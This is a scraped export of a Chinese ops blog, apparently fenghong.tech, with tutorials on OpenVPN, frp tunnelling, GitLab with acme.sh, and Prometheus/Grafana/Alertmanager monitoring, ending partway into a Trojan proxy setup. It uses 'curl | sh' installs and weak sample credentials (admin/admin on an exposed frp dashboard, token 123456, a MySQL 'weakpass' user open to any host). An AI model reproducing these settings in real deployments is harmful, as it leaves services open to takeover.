● openvpn@server.service - OpenVPN Robust And Highly Flexible Tunneling Application On server Loaded: loaded (/usr/lib/systemd/system/openvpn@.service; enabled; vendor preset: disabled) Active: active (running) since Tue 2020-05-19 09:29:31 CST; 1 day 5h ago Main PID: 3545 (openvpn) Status: \u0026quot;Initialization Sequence Completed\u0026quot; CGroup: /system.slice/system-openvpn.slice/openvpn@server.service └─3545 /usr/sbin/openvpn --cd /etc/openvpnserver/ --config server.conf May 19 09:29:31 server11-new systemd[1]: Starting OpenVPN Robust And Highly Flexible Tunneling Applicati...er... May 19 09:29:31 server11-new systemd[1]: Started OpenVPN Robust And Highly Flexible Tunneling Applicatio...rver. Hint: Some lines were ellipsized, use -l to show in full. $ systemctl status openvpn@udp ● openvpn@udp.service - OpenVPN Robust And Highly Flexible Tunneling Application On udp Loaded: loaded (/usr/lib/systemd/system/openvpn@.service; enabled; vendor preset: disabled) Active: active (running) since Wed 2020-05-20 11:34:08 CST; 3h 22min ago Main PID: 6212 (openvpn) Status: \u0026quot;Initialization Sequence Completed\u0026quot; CGroup: /system.slice/system-openvpn.slice/openvpn@udp.service └─6212 /usr/sbin/openvpn --cd /etc/openvpnserver/ --config udp.conf May 20 11:34:08 server11-new systemd[1]: Starting OpenVPN Robust And Highly Flexible Tunneling Applicati...dp... May 20 11:34:08 server11-new systemd[1]: Started OpenVPN Robust And Highly Flexible Tunneling Applicatio... udp. Hint: Some lines were ellipsized, use -l to show in full. 配置iptables转发, 因为服务器是内网, 内网ip基本不会变化, 这边用的SNAT替代了MASQUERADE.\niptables -t nat -A POSTROUTING -s 172.8.8.0/24 -j SNAT --to-source 192.168.0.11 iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -j SNAT --to-source 192.168.0.11 开机自启动 $ systemctl enable openvpn@server $ systemctl enable openvpn@udp 配置完成.\n客户端配置文件秘钥合并 ## 可以合并到脚本文件里面. $ echo \u0026quot; client dev tun proto tcp remote 123.45.67.89 6666 resolv-retry infinite nobind persist-key persist-tun \u0026lt;key\u0026gt; $(cat /etc/openvpnclient/${vpn_user}.key) \u0026lt;/key\u0026gt; \u0026lt;cert\u0026gt; $(openssl x509 -in /etc/openvpnclient/${vpn_user}.crt) \u0026lt;/cert\u0026gt; \u0026lt;ca\u0026gt; $(cat /etc/openvpnclient/ca.crt) \u0026lt;/ca\u0026gt; remote-cert-tls server comp-lzo verb 3 \u0026quot; \u0026gt; /etc/openvpnclient/new/${vpn_user}.ovpn 参考   SNAT和MASQUERADE的区别\n  tun和tap模式的区别\n  Tun/Tap设备基本原理\n  centos7安装openvpn\n  谢谢您的观看\n","permalink":"https://www.fenghong.tech/blog/ops/openvpn-tcp-udp/","tags":["ops","vpn","udp","tcp","server"],"title":"openvpn实现tcp和udp共存"},{"categories":["ops"],"contents":"[toc]\n前言  公司测试环境需要用到websocket项目. 因小程序需要https连接. 所以要弄wss. WebSocket可以使用 ws 或 wss 来作为统一资源标志符，类似于 HTTP 或 HTTPS。其中 ，wss 表示在 TLS 之上的 WebSocket，相当于 HTTPS。默认情况下，WebSocket的 ws 协议基于Http的 80 端口；当运行在TLS之上时，wss 协议默认是基于Http的 443 端口。说白了，wss 就是 ws 基于 SSL 的安全传输，与 HTTPS 一样样的道理。所以，如果你的网站是 HTTPS 协议的，那你就不能使用 ws:// 了，浏览器会 block 掉连接，和 HTTPS 下不允许 HTTP 请求一样。\n FRP作用 对于没有公网 IP 的内网用户来说，远程管理或在外网访问\u0008内网机器上的服务是一个问题。通常解决方案就是用内网穿透工具将内网的服务穿透到公网中，便于远程管理和在外部访问。内网穿透的工具很多, 比如 Ngrok.\n推荐一款好用到炸裂的内网穿透的工具frp, 全名: Fast Reverse Proxy. frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和https应用协议提供了额外的能力，且尝试性支持了点对点穿透。\n 利用处于内网或防火墙后的机器，对外网环境提供 HTTP 或 HTTPS 服务。 对于 HTTP, HTTPS 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个 80 端口。 利用处于内网或防火墙后的机器，对外网环境提供 TCP 和 UDP 服务，例如在家里通过 SSH 访问处于公司内网环境内的主机。 \u0026hellip;  FRP架构 内网使用websocket逻辑图 内部机器部署外网访问, 必要的就是一个公网ip + frp , 后面就是正常的nginx做web应用服务即可.\n配置相关 frps配置 [common] bind_addr = 0.0.0.0 bind_port = 7200 bind_udp_port = 7201 kcp_bind_port = 7200 vhost_http_port = 80 vhost_https_port = 443 dashboard_addr = 0.0.0.0 dashboard_port = 7500 dashboard_user = admin dashboard_pwd = admin log_file = ./frps.log log_level = debug log_max_days = 3 token = 123456 max_pool_count = 5 max_ports_per_client = 0 authentication_timeout = 0 tcp_mux = true fprc配置 [common] server_addr = frps公网服务器ip server_port = 7200 token = 123456 admin_addr = 127.0.0.1 admin_port = 7400 [http] type = http local_ip = 192.168.0.21 local_port = 80 remote_port = 80 use_encryption = false use_compression = true custom_domains = www.fenghong.tech [https] type = https local_ip = 192.168.0.21 local_port = 443 remote_port = 443 use_encryption = false use_compression = true use_gzip = true custom_domains = www.fenghong.tech nginx配置 server { server_name www.fenghong.tech ... location /webSocketServer { proxy_pass http://websocket; # 本地服务器地址及端口 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Host $host; proxy_set_header X-Forward-Proto https; proxy_http_version 1.1; # for websocket proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026quot;upgrade\u0026quot;; } ... } upstream websocket { ip_hash; server 192.168.0.63:7081 weight=1 max_fails=2 fail_timeout=30s; server 192.168.0.64:7081 weight=1 max_fails=2 fail_timeout=30s; } 配置结束.\n","permalink":"https://www.fenghong.tech/blog/ops/frpc-websocket/","tags":["frp","websocket","http","ssl"],"title":"内网穿透使用wss"},{"categories":["server","ops"],"contents":"[TOC]\n 背景: 源码仓库管理有很多, gitlab算是很经典的一款.\n前提:\n 安装 docker, docker-compose, nginx, acme.sh   效果成品图 部署 采用docker部署. 方便快捷. 数据持久化备份也简单.\n$ mkdir /home/data/gitlab/{config,data,logs} -p $ cd /home/data/gitlab/ $ vim docker-compose.yml version: \u0026quot;3\u0026quot; services: gitlab: container_name: gitlab privileged: true restart: always hostname: 'mxqh168.co' environment: GITLAB_OMNIBUS_CONFIG: | external_url \u0026quot;https://mxqh168.co\u0026quot; nginx['enable'] = true nginx['client_max_body_size'] = '1024m' nginx['redirect_http_to_https'] = true nginx['redirect_http_to_https_port'] = 80 nginx['ssl_certificate'] = \u0026quot;/etc/gitlab/ssl/mxqh168.co.cer\u0026quot; nginx['ssl_certificate_key'] = \u0026quot;/etc/gitlab/ssl/mxqh168.co.key\u0026quot; gitlab_rails['time_zone'] = 'Asia/Shanghai' gitlab_rails['gitlab_shell_ssh_port'] = 22 gitlab_rails['gitlab_email_enabled'] = true gitlab_rails['gitlab_email_from'] = '18795605909@163.com' gitlab_rails['smtp_enable'] = true gitlab_rails['smtp_address'] = \u0026quot;smtp.163.com\u0026quot; gitlab_rails['smtp_port'] = 465 gitlab_rails['smtp_user_name'] = \u0026quot;18795605909@163.com\u0026quot; gitlab_rails['smtp_password'] = \u0026quot;*************\u0026quot; #这个是网易的授权登录码 gitlab_rails['smtp_domain'] = \u0026quot;163.com\u0026quot; gitlab_rails['smtp_authentication'] = \u0026quot;login\u0026quot; gitlab_rails['smtp_enable_starttls_auto'] = true gitlab_rails['smtp_tls'] = true ports: - '10080:80' - '10443:443' - '22:22' volumes: - '/home/data/gitlab/config:/etc/gitlab' - '/home/data/gitlab/logs:/var/log/gitlab' - '/home/data/gitlab/data:/var/opt/gitlab' $ docker-compose up -d  关于ssh端口问题.\n gitlab的服务器使用的是 SSH 默认端口 22 去映射容器 SSH 端口。其目的是希望比较自然的使用类似 git@gitlab.example.com:myuser/awesome-project.git 的形式来访问服务器版本库。但是，宿主服务器上默认的 SSH 服务也是使用的 22 端口。因此默认会产生端口冲突。\n修改宿主的 SSH 端口，使用非 22 端口。比如修改 SSHD 配置文件，/etc/ssh/sshd_config，将其中的 Port 22 改为其它端口号，然后 service sshd restart。这种方式比较推荐，因为管理用的宿主 SSH 端口改成别的其实更安全。\nnginx 配置 nginx配置和ssl证书是需要同步进行的. 先配置80端口, 然后配置ssl证书,然后再配置https. 这些操作就懒得再重复写了.\nserver { listen 80; server_name mxqh168.co; return 301 https://mxqh168.co$request_uri; # 用户ssl证书生成 location /.well-known/acme-challenge/ { alias /var/www/ssl/.well-known/acme-challenge/; } } server { listen 443 ssl; server_name mxqh168.co; ssl_certificate /etc/nginx/certs/mxqh168.co.cer; ssl_certificate_key /etc/nginx/certs/mxqh168.co.key; location / { proxy_pass https://gitlab; } location /.well-known/acme-challenge/ { alias /var/www/ssl/.well-known/acme-challenge/; } } upstream gitlab { server 127.0.0.1:10443 weight=1 max_fails=2 fail_timeout=30s; } # 启动nginx $ nginx ssl证书生成 采用acme.sh进行免费生成ssl证书. 这里没有用到api生成, 采用的是目录验证方式.\n$ curl https://get.acme.sh | sh $ mkdir /var/www/ssl/.well-known/acme-challenge -p ## 生成ssl证书. $ acme.sh --issue -d mxqh168.co -w /var/www/ssl/ ## 生成宿主机nginx的ssl证书 $ acme.sh --install-cert -d mxqh168.co \\ --key-file /etc/nginx/certs/mxqh168.co.key \\ --fullchain-file /etc/nginx/certs/mxqh168.co.cer \\ --reloadcmd \u0026quot;nginx -s reload\u0026quot; ## 生成docker容器里面的证书 $ acme.sh --install-cert -d mxqh168.co --key-file \\ /home/data/gitlab/config/ssl/mxqh168.co.key --fullchain-file \\ /home/data/gitlab/config/ssl/mxqh168.co.cer 访问 https://mxqh168.co 即可\ngitlab管理员密码更改 ## 1. 查看容器 $ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 3da8f1560c55 twang2218/gitlab-ce-zh \u0026quot;/assets/wrapper\u0026quot; 2 weeks ago Up 2 weeks (healthy) 0.0.0.0:22-\u0026gt;22/tcp, 0.0.0.0:10080-\u0026gt;80/tcp, 0.0.0.0:10443-\u0026gt;443/tcp gitlab ## 2. 进入gitlab容器 $ docker exec -it 3da8f1560c55 /bin/sh ## 3. 加载gitlab-rails控制台 # gitlab-rails console -e production ------------------------------------------------------------------------------------- GitLab: 11.1.4 (63daf37) GitLab Shell: 7.1.4 postgresql: 9.6.8 ------------------------------------------------------------------------------------- Loading production environment (Rails 4.2.10) irb(main):001:0\u0026gt; ## 4. 查找admin用户 ### 方法一 irb(main):001:0\u0026gt; user = User.where(id: 1).first ### 方法二 irb(main):001:0\u0026gt; user = User.find_by(email: 'admin@example.com') ## 5. 更改密码并保存 irb(main):002:0\u0026gt; user.password = 'secret_pass' irb(main):003:0\u0026gt; user.password_confirmation = 'secret_pass' irb(main):004:0\u0026gt; user.save! ","permalink":"https://www.fenghong.tech/blog/ops/gitlab-ce-zh-install-with-https/","tags":["gitlab","git","nginx","ssl","acme"],"title":"gitlab-ce-zh部署并开启https"},{"categories":["server","ops"],"contents":"[TOC]\n摘要：\n 系统监控报警 prometheus alertmanager   背景：由于公司内网有几台服务器, 想着这几台服务没有什么监控, 故而整个监控系统玩玩. 练练手\n有了监控, 必须得有告警啊, 不然时时刻刻盯着也不是事情.\n 效果图 prometheus告警状态效果\n异常发送邮件告警\n部署 从github下载源码, 或者使用wget下载\n$ cd /usr/local/ $ wget https://github.com/prometheus/alertmanager/releases/download/v0.20.0/alertmanager-0.20.0.linux-amd64.tar.gz $ tar xf alertmanager-0.20.0.linux-amd64.tar.gz $ mv alertmanager-0.20.0.linux-amd64 alertmanager $ cat \u0026gt; /usr/local/alertmanager/alertmanager.service \u0026lt;\u0026lt;EOF [Unit] Description=alertmanager After=network.target [Service] Type=simple ExecStart=/usr/local/alertmanager/alertmanager --config.file=/usr/local/alertmanager/alertmanager.yml Restart=on-failure [Install] WantedBy=multi-user.target EOF $ ln -s /usr/local/alertmanager/alertmanager.service /lib/systemd/system/alertmanager.service 配置alertmanager global: resolve_timeout: 5m smtp_smarthost: 'smtp.mxhichina.com:465' # 邮箱smtp服务器代理 smtp_from: 'louis.hong@junhsue.com' # 发送邮箱名称 smtp_auth_username: 'louis.hong@junhsue.com' # 邮箱名称 smtp_auth_password: '****' # 邮箱密码或授权码 smtp_require_tls: false route: group_by: ['alertname'] group_wait: 10s # 当收到告警的时候，等待三十秒看是否还有告警，如果有就一起发出去 group_interval: 10s # 发送警告间隔时间 repeat_interval: 1h # 重复报警的间隔时间 receiver: 'mail' # 全局报警组，这个参数是必选的，和下面报警组名要相同 receivers: - name: 'mail' email_configs: - to: 'louis.hong@junhsue.com' 启动服务即可\nsystemctl start alertmanager systemctl status alertmanager 配置prometheus规则 $ vim /usr/local/prometheus/prometheus.yml # Alertmanager configuration alerting: alertmanagers: - static_configs: - targets: ['localhost:9093'] # Load rules once and periodically evaluate them according to the global 'evaluation_interval'. rule_files: - \u0026quot;rule.yml\u0026quot; $ vim /usr/local/prometheus/rule.yml groups: - name: 主机状态-监控告警 rules: - alert: 主机状态 expr: up == 0 for: 1m labels: status: 非常严重 annotations: summary: \u0026quot;{{$labels.instance}}:服务器宕机\u0026quot; description: \u0026quot;{{$labels.instance}}:服务器延时超过5分钟\u0026quot; - alert: CPU使用情况 expr: 100-(avg(irate(node_cpu_seconds_total{mode=\u0026quot;idle\u0026quot;}[5m])) by(instance)* 100) \u0026gt; 80 for: 1m labels: status: 一般告警 annotations: summary: \u0026quot;{{$labels.mountpoint}} CPU使用率过高！\u0026quot; description: \u0026quot;{{$labels.mountpoint }} CPU使用大于80%(目前使用:{{$value}}%)\u0026quot; - alert: 内存使用 expr: round(100- node_memory_MemAvailable_bytes/node_memory_MemTotal_bytes*100) \u0026gt; 90 for: 1m labels: severity: warning annotations: summary: \u0026quot;内存使用率过高\u0026quot; description: \u0026quot;当前使用率{{ $value }}%\u0026quot; - alert: IO性能 expr: 100-(avg(irate(node_disk_io_time_seconds_total[1m])) by(instance)* 100) \u0026lt; 60 for: 1m labels: status: 严重告警 annotations: summary: \u0026quot;{{$labels.mountpoint}} 流入磁盘IO使用率过高！\u0026quot; description: \u0026quot;{{$labels.mountpoint }} 流入磁盘IO大于60%(目前使用:{{$value}})\u0026quot; - alert: 网络 expr: ((sum(rate (node_network_receive_bytes_total{device!~'tap.*|veth.*|br.*|docker.*|virbr*|lo*'}[5m])) by (instance)) / 100) \u0026gt; 102400 for: 1m labels: status: 严重告警 annotations: summary: \u0026quot;{{$labels.mountpoint}} 流入网络带宽过高！\u0026quot; description: \u0026quot;{{$labels.mountpoint }}流入网络带宽持续2分钟高于100M. RX带宽使用率{{$value}}\u0026quot; - alert: TCP会话 expr: node_netstat_Tcp_CurrEstab \u0026gt; 1000 for: 1m labels: status: 严重告警 annotations: summary: \u0026quot;{{$labels.mountpoint}} TCP_ESTABLISHED过高！\u0026quot; description: \u0026quot;{{$labels.mountpoint }} TCP_ESTABLISHED大于1000%(目前使用:{{$value}}%)\u0026quot; - alert: 磁盘容量 expr: 100-(node_filesystem_free_bytes{fstype=~\u0026quot;ext4|xfs\u0026quot;}/node_filesystem_size_bytes {fstype=~\u0026quot;ext4|xfs\u0026quot;}*100) \u0026gt; 80 for: 1m labels: status: 严重告警 annotations: summary: \u0026quot;{{$labels.mountpoint}} 磁盘分区使用率过高！\u0026quot; description: \u0026quot;{{$labels.mountpoint }} 磁盘分区使用大于80%(目前使用:{{$value}}%)\u0026quot; 重新启动prometheus服务即可\n$ systemctl restart prometheus 访问prometheus, http://serverip:9090/.\n验证 将报警的阈值调低即可收到邮件.\n","permalink":"https://www.fenghong.tech/blog/ops/prometheus-alertmanager/","tags":["prometheus","grafana","alertmanager","node_exporter","nginx"],"title":"配置prometheus告警规则"},{"categories":["server","ops"],"contents":"[TOC]\n摘要：\n 系统监控 prometheus   背景：由于公司内网有几台服务器, 想着这几台服务没有什么监控, 故而整个监控系统玩玩. 练练手\n 效果图 服务器基本状态效果\nmysql监控状态\n前置知识 在编写应用程序的时候，通常会记录 Log 以便事后分析，在很多情况下是产生了问题之后，再去查看 Log ，是一种事后的静态分析。在很多时候，我们可能需要了解整个系统在当前，或者某一时刻运行的情况，比如当前系统中对外提供了多少次服务，这些服务的响应时间是多少，随时间变化的情况是什么样的，系统出错的频率是多少。这些动态的准实时信息对于监控整个系统的运行健康状况来说很重要。于是就产生了 metrics 这种数据. 详情查看https://monitor.lucien.ink/metrics\nprometheus简介  Prometheus 是一套开源的系统监控、报警、时间序列数据库的组合，最初有 SoundCloud 开发的，后来随着越来越多公司使用，于是便独立成开源项目。 我们常用的 Kubernetes 容器集群管理中，通常会搭配 Prometheus 一起来进行监控。Prometheus 基本原理是通过 Http 协议周期性抓取被监控组件的状态，而输出这些被监控的组件的 Http 接口为 Exporter. 现在各个公司常用的 Exporter 都已经提供了，可以直接安装使用，如 haproxy_exporter、blockbox_exporter、mysqld_exporter、node_exporter 等等，更多支持的组件\n Grafana 介绍  Grafana 是一个可视化仪表盘，它拥有美观的图标和布局展示，功能齐全的仪表盘和图形编辑器，默认支持 CloudWatch、Graphite、Elasticsearch、InfluxDB、Mysql、PostgreSQL、Prometheus、OpenTSDB 等作为数据源。\n我们可以将 Prometheus 抓取的数据，通过 Grafana 优美的展示出来，非常直观。\n Grafana、Prometheus、Exporter之间的关系  Exporter 的主要任务是提供 metrics 信息。\nmetrics 大多数人是看不懂的，所以 Prometheus 为这种格式的信息提供了 Prometheus Query Language (PromQL) ，可以进行一些类似数据库那样的联合查询、过滤等操作，这样一来就能提炼出我们想要的东西，类似于内存占用、负载等.\n虽然 PromQL 非常的强大，但是对于大部分人来说是有很高的学习成本的，所以 Grafana 就将各种 PromQL 封装起来，并将 PromQL 的结果以图表的形式展示出来。\n当然了，Prometheus 和 Grafana 的功能远不止如此，更强大的是报警功能，但这不是本文的主题。\n 部署 本文采用的安装方式皆为二进制 + systemd 托管的安装方式。 更多的有docker部署， k8s部署. 详情可以查阅官网.\n下载  node_exporter： https://github.com/prometheus/node_exporter/releases Prometheus：https://github.com/prometheus/prometheus/releases Grafana（选择 Standalone Linux Binaries 版本）：https://grafana.com/grafana/download  安装 $ mkdir /usr/local/monitor $ cd /usr/local/monitor ## 保证目录结构如下 $ tree . . ├── grafana-x.x.x.linux-amd64.tar.gz ├── node_exporter-x.x.x.linux-amd64.tar.gz └── prometheus-x.x.x.linux-amd64.tar.gz $ wget https://github.com/prometheus/prometheus/releases/download/v2.17.1/prometheus-2.17.1.linux-amd64.tar.gz $ wget https://dl.grafana.com/oss/release/grafana-6.7.2.linux-amd64.tar.gz $ wget https://github.com/prometheus/node_exporter/releases/download/v1.0.0-rc.0/node_exporter-1.0.0-rc.0.linux-amd64.tar.gz $ vim install.sh for FILE in `ls`; do tar -xzvf ${FILE} \u0026amp;\u0026amp; rm ${FILE}; done FILE_LIST=\u0026quot;grafana prometheus node_exporter\u0026quot; for FILE in ${FILE_LIST}; do rm -rf /usr/local/${FILE} \u0026amp;\u0026amp; mv ${FILE}* /usr/local/${FILE}; done rm -f /lib/systemd/system/grafana-server.service rm -f /lib/systemd/system/prometheus.service rm -f /lib/systemd/system/node_exporter.service cat\u0026gt;/usr/local/grafana/grafana-server.service\u0026lt;\u0026lt;EOF [Unit] Description=Grafana Server After=network.target [Service] Type=simple User=root WorkingDirectory=/usr/local/grafana ExecStart=/usr/local/grafana/bin/grafana-server Restart=on-failure LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF cat\u0026gt;/usr/local/prometheus/prometheus.service\u0026lt;\u0026lt;EOF [Unit] Description=Prometheus After=network.target [Service] Type=simple User=root WorkingDirectory=/usr/local/prometheus ExecStart=/usr/local/prometheus/prometheus --config.file=/usr/local/prometheus/prometheus.yml Restart=on-failure LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF cat\u0026gt;/usr/local/node_exporter/node_exporter.service\u0026lt;\u0026lt;EOF [Unit] Description=Node Exporter After=network.target Wants=network-online.target [Service] Type=simple User=root ExecStart=/usr/local/node_exporter/node_exporter Restart=on-failure LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF ln -s /usr/local/grafana/grafana-server.service /usr/local/prometheus/prometheus.service /usr/local/node_exporter/node_exporter.service /lib/systemd/system/ systemctl daemon-reload systemctl start node_exporter systemctl start grafana-server systemctl start prometheus $ sh install.sh 验证是否安装成功 # 查看运行状态 $ systemctl status node_exporter $ systemctl status prometheus $ systemctl status grafana-server $ # 查看metrics $ curl localhost:9100/metrics $ curl localhost:9090/metrics $ curl localhost:3000/metrics 配置服务 $ sed -i 's/localhost:9090/localhost:9100/' /usr/local/prometheus/prometheus.yml ## 这个修改会让 Prometheus 从 localhost:9100/metrics 进行 metrics 信息的读取， # 默认的 9090 是 Prometheus 本身的 metrics 信息。 # 9100 是 node_exporter的metrics 信息读取端口 $ systemctl restart prometheus 配置grafana插件 # 安装一个 饼图 的插件 $ cd /usr/local/grafana/bin $ chmod +x grafana-cli $ ./grafana-cli plugins install grafana-piechart-panel $ systemctl restart grafana-server $ cp -r /var/lib/grafana/plugins/grafana-piechart-panel /usr/local/grafana/data/plugins 登录进行数据接入 访问 http://localhost:3000, 账号密码默认为: admin/admin.\n成功访问后, 点击 Add data source。选择 Prometheus。\nHttp URL 中填入 http://localhost:9090 ，也就是 prometheus 提供的接口。然后保存即可.\n引入Exporter写好的dashboard 然后把鼠标挪到左上角的 + 上，注意是挪上去，然后在弹出的菜单中点击 Import。\n选择id为8919的一个dashboard. 国人自己写的. https://grafana.com/dashboards/8919\n点击空白处之后会自动导入对应的 Dashboard ，此时会让你设置数据来源，在 Options prometheus_111 这里选择我们刚才添加的 Prometheus ，然后点击 Import 就可以了.\n监控多个节点 在完成了本文的 、 部分之后，仅仅是完成了监控本机的过程，如果要监控其它的节点，需在被监控的节点上安装相应的 Exporter，下面以本文中提到的 node_exporter 为例，介绍如何添加节点。\n$ wget https://github.com/prometheus/node_exporter/releases/download/v1.0.0-rc.0/node_exporter-1.0.0-rc.0.linux-amd64.tar.gz $ cat\u0026gt;/usr/local/node_exporter/node_exporter.service\u0026lt;\u0026lt;EOF [Unit] Description=Node Exporter After=network.target Wants=network-online.target [Service] Type=simple User=root ExecStart=/usr/local/node_exporter/node_exporter Restart=on-failure LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF $ ln -s /usr/local/node_exporter/node_exporter.service /lib/systemd/system/ $ systemctl start node_exporter ## 如果9100端口被占用了 . 可以使用下面的命令更改监听端口. $ cd /usr/local/node_exporter/ $ nohup ./node_exporter --web.listen-address=\u0026quot;:9101\u0026quot; \u0026amp; 配置prometheus ## 在监控节点上编辑 Prometheus 的配置文件 /usr/local/prometheus/prometheus.yml。 $ vim /usr/local/prometheus/prometheus.yml global: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. # scrape_timeout is set to the global default (10s). # Alertmanager configuration alerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093 # Load rules once and periodically evaluate them according to the global 'evaluation_interval'. rule_files: # - \u0026quot;first_rules.yml\u0026quot; # - \u0026quot;second_rules.yml\u0026quot; # A scrape configuration containing exactly one endpoint to scrape: # Here it's Prometheus itself. scrape_configs: # The job name is added as a label `job=\u0026lt;job_name\u0026gt;` to any timeseries scraped from this config. - job_name: 'prometheus' # metrics_path defaults to '/metrics' # scheme defaults to 'http'. static_configs: - targets: ['localhost:9100', '$addr:9100'] ############### 我们需要修改这里 将$addr:9100换为自己的真实ip及端口. 保存后重启服务即可.\ntargets 传入的是一个数组，Prometheus 会收集数组中的每个元素的 metrics ，然后 Grafana 再处理这些数据。\n$ systemctl restart prometheus 监控mysqld 下载mysqld_exporter\n$ cd /usr/local $ wget https://github.com/prometheus/mysqld_exporter/releases/download/v0.12.1/mysqld_exporter-0.12.1.linux-amd64.tar.gz 部署mysqld_exporter\n$ cd /usr/local/ $ tar xf mysqld_exporter-0.12.1.linux-amd64.tar.gz $ cd mysqld_exporter-0.12.1.linux-amd64 ## 这里创建mysql用户和授权 mysql\u0026gt; grant replication client, process on *.* to prometheus@\u0026quot;%\u0026quot; identified by \u0026quot;weakpass\u0026quot;; mysql\u0026gt; grant select on performance_schema.* to prometheus@\u0026quot;%\u0026quot;; mysql\u0026gt; flush previleges; $ vim .my.cnf [client] host=192.168.0.21 port=3306 user=prometheus password=weakpass ## 默认监听是9104端口 $ nohup ./mysqld_exporter --config.my-cnf=./.my.cnf \u0026amp; 验证 $ curl localhost:9104/metrics 配置Prometheus接入mysql的metrics数据。\n## 严格注意缩进 $ vim /sur/local/prometheus/prometheus.yml - job_name: 'mysql' static_configs: - targets: ['192.168.0.21:9104'] 登录进行数据接入 访问 http://localhost:3000, 账号密码默认为: admin/admin.\n成功访问后, 点击 Add data source。选择 Prometheus。\nHttp URL 中填入 http://localhost:9090 ，也就是 prometheus 提供的接口。然后保存即可.\n引入Exporter写好的dashboard 然后把鼠标挪到左上角的 + 上，注意是挪上去，然后在弹出的菜单中点击 Import。选择id为7362.\n选择Folder为general。 Prometheus选择Prometheus， 再导入即可。\n至此， 基本结束。\n","permalink":"https://www.fenghong.tech/blog/ops/grafana-prometheus-node_exporter-mysql/","tags":["prometheus","grafana","mysql","node_exporter","nginx"],"title":"搭建prometheus监控系统"},{"categories":["server","ops"],"contents":"[TOC]\n摘要：\n 科学上网 trojan   背景：由于ss，ssr流量特征不明显导致其明显， 故而转战trojan。\n trojan简介 An unidentifiable mechanism that helps you bypass GFW。\n原理 如图所示，Trojan工作在443端口，所以它会占用443端口， 处理来自外界的HTTPS请求，如果是Trojan请求，那么为该请求提供服务， 如果不是它就会将该流量转交给Nginx，由Nginx为其提供服务。 通过这个工作过程可以知道，Trojan的一切表现均与Nginx一致， 不会引入额外特征，从而达到无法识别的效果。 当然，为了防止恶意探测，我们需要将80端口的流量全部重定向到443端口， 并且服务器只暴露80和443端口，80端口还是由nginx管理， 但443则由trojan管理，所以要赋予它监听443的权力， 这样可以使得服务器与常见的Web服务器表现一致。 前提要求   系统要求：Ubuntu \u0026gt;= 16.04 or Debian \u0026gt;= 9 or CentOS \u0026gt;= 7\n  服务器：1H256M （最低配），带宽\u0026gt;100M 大小4G+\n  域名： 任意\n  torjan: v1.14.1\n  服务器安装依赖程序及证书配置 安装wget和nginx\n$ yum install wget nginx vim -y 安装trojan\n$ cd /opt $ wget https://github.com/trojan-gfw/trojan/releases/download/v1.14.1/trojan-1.14.1-linux-amd64.tar.xz $ tar xf trojan-1.14.1-linux-amd64.tar.xz 安装ssl证书, 使用acme项目进行安装ssl证书, 具体细节可以查看我之前写的免费证书证书ssl安装. 采用阿里云的api进行申请免费证书. (默认域名在阿里云购买)\n$ curl https://get.acme.sh | sh $ export Ali_Key=\u0026quot;sdfsdfsdfljlbjkljlkjsdfoiwje\u0026quot; $ export Ali_Secret=\u0026quot;jlsdflanljkljlfdsaklkjflsa\u0026quot; $ acme.sh --issue --dns dns_ali -d '*.example.com' --force $ acme.sh --install-cert -d *.example.com --key-file /etc/nginx/certs/cert.example.com.key --fullchain-file /etc/nginx/certs/example.fullchain.cer --force 服务器相关配置修改 trojan配置修改\n$ cd /opt/trojan $ cat config.json { \u0026quot;run_type\u0026quot;: \u0026quot;server\u0026quot;, \u0026quot;local_addr\u0026quot;: \u0026quot;0.0.0.0\u0026quot;, \u0026quot;local_port\u0026quot;: 443, \u0026quot;remote_addr\u0026quot;: \u0026quot;127.0.0.1\u0026quot;, \u0026quot;remote_port\u0026quot;: 80, \u0026quot;password\u0026quot;: [ \u0026quot;password\u0026quot; //修改成自己的密码 ], \u0026quot;log_level\u0026quot;: 1, \u0026quot;ssl\u0026quot;: { \u0026quot;cert\u0026quot;: \u0026quot;/etc/nginx/certs/fenghong.tech/fullchain.cer\u0026quot;, //修改成自己生成的证书 \u0026quot;key\u0026quot;: \u0026quot;/etc/nginx/certs/fenghong.tech/cert.fenghong.key\u0026quot;, //修改成自己的生成的秘钥 \u0026quot;key_password\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;cipher\u0026quot;: \u0026quot;ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384\u0026quot;, \u0026quot;cipher_tls13\u0026quot;: \u0026quot;TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384\u0026quot;, \u0026quot;prefer_server_cipher\u0026quot;: true, \u0026quot;alpn\u0026quot;: [ \u0026quot;http/1.1\u0026quot; ], \u0026quot;reuse_session\u0026quot;: true, \u0026quot;session_ticket\u0026quot;: false, \u0026quot;session_timeout\u0026quot;: 600, \u0026quot;plain_http_response\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;curves\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;dhparam\u0026quot;: \u0026quot;\u0026quot; }, \u0026quot;tcp\u0026quot;: { \u0026quot;prefer_ipv4\u0026quot;: false, \u0026quot;no_delay\u0026quot;: true, \u0026quot;keep_alive\u0026quot;: true, \u0026quot;reuse_port\u0026quot;: false, \u0026quot;fast_open\u0026quot;: false, \u0026quot;fast_open_qlen\u0026quot;: 20 }, \u0026quot;mysql\u0026quot;: { \u0026quot;enabled\u0026quot;: false, \u0026quot;server_addr\u0026quot;: \u0026quot;127.0.0.1\u0026quot;, \u0026quot;server_port\u0026quot;: 3306, \u0026quot;database\u0026quot;: \u0026quot;trojan\u0026quot;, 